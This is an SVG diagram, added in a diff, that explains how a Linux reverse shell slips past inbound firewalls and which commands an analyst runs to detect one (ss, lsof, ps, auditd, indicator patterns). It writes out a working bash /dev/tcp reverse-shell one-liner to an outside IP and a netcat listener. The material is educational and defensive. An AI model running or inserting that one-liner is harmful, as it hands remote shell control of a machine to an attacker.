@@ -1,0 +1,77 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 960 430" role="img" aria-label="How a Linux reverse shell connects a compromised host back to an attacker, why it evades inbound firewalls, and the commands an analyst uses to see it.">
+  <title>A Linux reverse shell, and how an analyst spots the outbound connection</title>
+  <defs>
+    <style>
+      .bg    { fill: #0b0f1e; }
+      .ui    { font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, sans-serif; }
+      .mono  { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+      .box   { fill: #0e1b30; stroke: #334155; stroke-width: 1.5; }
+      .attack{ fill: #26100f; stroke: #f87171; stroke-width: 1.5; }
+      .victim{ fill: #0e1b30; stroke: #22d3ee; stroke-width: 1.5; }
+      .fw    { fill: #241a06; stroke: #fbbf24; stroke-width: 2; }
+      .t     { fill: #e2e8f0; font-size: 13px; font-weight: 700; }
+      .s     { fill: #94a3b8; font-size: 11px; }
+      .warn  { fill: #fca5a5; font-size: 11px; }
+      .cyan  { fill: #67e8f9; font-size: 11px; }
+      .det   { fill: #86efac; font-size: 11px; }
+      .head  { fill: #cbd5e1; font-size: 12px; font-weight: 700; letter-spacing: .05em; }
+      .flow  { stroke: #f87171; stroke-width: 2.5; fill: none; marker-end: url(#ar); }
+    </style>
+    <marker id="ar" markerWidth="10" markerHeight="10" refX="8" refY="3.5" orient="auto"><path d="M0,0 L8,3.5 L0,7 Z" fill="#f87171"/></marker>
+  </defs>
+  <rect class="bg" x="0" y="0" width="960" height="430"/>
+
+  <text class="ui head" x="30" y="30">A REVERSE SHELL: THE VICTIM DIALS OUT (SO THE INBOUND FIREWALL NEVER SEES IT)</text>
+
+  <!-- victim -->
+  <rect class="victim" x="30" y="55" width="300" height="150" rx="10"/>
+  <text class="ui t" x="46" y="80">Compromised Linux host</text>
+  <text class="ui s" x="46" y="102">The attacker's code runs this:</text>
+  <text class="ui mono cyan" x="46" y="126">bash -i &gt;&amp; /dev/tcp/185.4.2.9/4444 0&gt;&amp;1</text>
+  <text class="ui s" x="46" y="150">/dev/tcp is a bash feature — no tool</text>
+  <text class="ui s" x="46" y="166">to install. It opens an OUTBOUND</text>
+  <text class="ui s" x="46" y="182">connection and hands the shell over it.</text>
+
+  <!-- firewall -->
+  <rect class="fw" x="392" y="70" width="120" height="120" rx="10"/>
+  <text class="ui" x="452" y="120" text-anchor="middle" style="fill:#fcd34d;font-size:12px;font-weight:700">FIREWALL</text>
+  <text class="ui s" x="452" y="144" text-anchor="middle">blocks inbound,</text>
+  <text class="ui s" x="452" y="160" text-anchor="middle">allows outbound</text>
+  <text class="ui s" x="452" y="176" text-anchor="middle">→ lets it pass</text>
+
+  <!-- attacker -->
+  <rect class="attack" x="574" y="55" width="300" height="150" rx="10"/>
+  <text class="ui t" x="590" y="80" style="fill:#fca5a5">Attacker's listener</text>
+  <text class="ui mono warn" x="590" y="104">nc -lvnp 4444</text>
+  <text class="ui s" x="590" y="128">Waiting on port 4444. When the</text>
+  <text class="ui s" x="590" y="144">victim connects out, the attacker</text>
+  <text class="ui s" x="590" y="160">gets an interactive root/user shell</text>
+  <text class="ui s" x="590" y="176">— inbound rules never applied.</text>
+
+  <line class="flow" x1="330" y1="150" x2="392" y2="150"/>
+  <line class="flow" x1="512" y1="150" x2="572" y2="150"/>
+  <text class="ui warn" x="330" y="228" text-anchor="middle">the shell travels OUTBOUND, victim → attacker  ▶▶▶</text>
+
+  <!-- detection -->
+  <text class="ui head" x="30" y="268">WHAT THE ANALYST RUNS TO SEE IT (on the host)</text>
+  <rect class="box" x="30" y="284" width="270" height="120" rx="10"/>
+  <text class="ui det" x="46" y="308" style="font-weight:700">The live connection</text>
+  <text class="ui mono s" x="46" y="330">ss -tnp   (or netstat -tnp)</text>
+  <text class="ui s" x="46" y="350">Shows an ESTABLISHED outbound</text>
+  <text class="ui s" x="46" y="368">session to a strange IP:4444,</text>
+  <text class="ui s" x="46" y="386">owned by a bash/nc process.</text>
+
+  <rect class="box" x="315" y="284" width="270" height="120" rx="10"/>
+  <text class="ui det" x="331" y="308" style="font-weight:700">The process behind it</text>
+  <text class="ui mono s" x="331" y="330">lsof -i :4444  ·  ps -ef</text>
+  <text class="ui s" x="331" y="350">Ties the socket to a PID and its</text>
+  <text class="ui s" x="331" y="368">parent — a shell whose parent is</text>
+  <text class="ui s" x="331" y="386">a web server or cron is the tell.</text>
+
+  <rect class="box" x="600" y="284" width="274" height="120" rx="10"/>
+  <text class="ui det" x="616" y="308" style="font-weight:700">The command that ran</text>
+  <text class="ui mono s" x="616" y="330">auditd EXECVE · bash_history</text>
+  <text class="ui s" x="616" y="350">Look for /dev/tcp, nc, socat, or a</text>
+  <text class="ui s" x="616" y="368">python -c one-liner. Egress from a</text>
+  <text class="ui s" x="616" y="386">SERVER to a random high port = alarm.</text>
+</svg>
